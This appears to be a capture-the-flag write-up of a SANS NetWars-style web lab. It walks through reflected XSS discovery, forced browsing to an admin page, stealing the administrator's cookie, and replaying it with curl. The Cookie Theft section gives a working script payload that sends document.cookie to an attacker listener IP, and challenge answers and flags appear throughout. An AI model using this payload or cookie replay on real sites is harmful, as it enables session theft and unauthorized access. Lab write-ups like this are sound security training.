# Contact

* Challenge - Interact with the contact form on the http://www.issplaylist.com website. What is the flag returned as the reference number?
* Points - 3
* Answer - NetWars{ContactFormSubmitted} 

First, I navigated to the website in the question. From there, I clicked Contact in the navbar at the top of the site to go to the contact form. After that, I submitted the form with expected input to get the flag. 

![Contact-2](https://github.com/user-attachments/assets/b6e69b17-d014-40da-a89b-01f74dc2b186)
![Contact-3](https://github.com/user-attachments/assets/2dda7127-bda9-4f27-8425-948b6cbbf6f5)


# Vulnerability Discovery

* Challenge - Explore the Contact page on the http://www.issplaylist.com website to identify a vulnerability. Identify the type of vulnerability.
* Points - 5
* Answer - Cross-Site Scripting

First, I tried experiemnting with including a ' in the fields to get an SQL error. That did not work, as I got the same flag as the previous challenge. 
![Vulnerability Discovery-2](https://github.com/user-attachments/assets/0e6de2c5-1d7d-4132-9b4d-613c304e6b7c)

Then I tested for an XSS vulnerability by typing the hr HTML tag into each field of the contact form. I noticed the horizontal line from the hr HTML tag was displayed on the page. 
![Vulnerability Discovery-3](https://github.com/user-attachments/assets/f4add8de-bcef-4607-85cd-37f41ae9ea2f)

This means my input was reflected on the page. To confirm this, I viewed the page source, and used CTRL + F to look for my input, the hr HTML tag. The page source shows my input. All of this means that the site is vulnerable to XSS, but specifically reflected XSS. 
![Vulnerability Discovery-4](https://github.com/user-attachments/assets/41bba667-32ad-4ad5-b657-65ed34138328)


# Forced Browsing

* Challenge - Identify the hidden page on the http://www.issplaylist.com server. Submit the page name (XXXXX.html).
* Points - 5
* Answer - admin.html

Typically, admin pages are hidden from normal users. If a web server is misconfigured, you can just go straight to the admin page with a forced browsing attack. From the question, we know the page name is five characters. So I typed issplaylist.com/admin.html in my browser and saw an admin page. 
![Forced Browsing-2](https://github.com/user-attachments/assets/17690325-9e0f-4325-b4b2-1b41ab424daf)

# Cookie Theft

* Challenge - Administrators for the http://www.issplaylist.com site frequently examine the contact page submissions using their browsers. Exploit the site vulnerability to steal cookie content from the administrator. What is the name of the cookie used to authenticate administrative users?
* Points - 5
* Answer - wwwlogincookie

From the Vulnerability Discovery challenge, I know the site is vulnerable to reflected XSS. From Lab 4.4, SANS supplied to us a cookiecatcher PHP file. I started a PHP web server to listen for the cookie.

![Cookie Theft-2](https://github.com/user-attachments/assets/2c7745ff-5355-45e6-b776-8a5f270ba28d)

After starting the listener on my attacker terminal, I went back to the browser. At the contact form, I put the following string in all of the fields then submited the form - <script>document.location='http://10.142.148.12:2222/?'+document.cookie;</script>

![Cookie Theft-3](https://github.com/user-attachments/assets/27d2e9b7-6333-4f3a-9d7d-363310cc713b)


Going back to my attacker terminal, where the cookiecatcher file is running, I can see the name of the stolen cookie. 

![Cookie Theft-4](https://github.com/user-attachments/assets/fb3b55f2-da85-4847-927a-7a633a6b07a5)


# Unauthorized Access

* Challenge - Use the stolen cookie to access the admin page. Submit the flag.
* Points - 5
* Answer - NetWars{AdminAccessIsBest}

Now that I have the cookie for admin from the Cookie Theft challenge, I can use curl and the -b argument to specify a token and return the content of that page as if I were logging in as admin. In my attacker terminal, I ran the following command: 
* curl -b wwwlogincookie=0f186582606b62965d90e772e76a8a5620b11af9 "http://www.issplaylist.com/admin.html"

This returned the admin page output. Scroll down to see the flag. 
![Unauthorized Access-2](https://github.com/user-attachments/assets/922e6443-10d2-454e-bd81-05d523dab0ac)
![Unauthorized Access-3](https://github.com/user-attachments/assets/ee50190d-5dd2-42a7-9b40-7845162253c9)
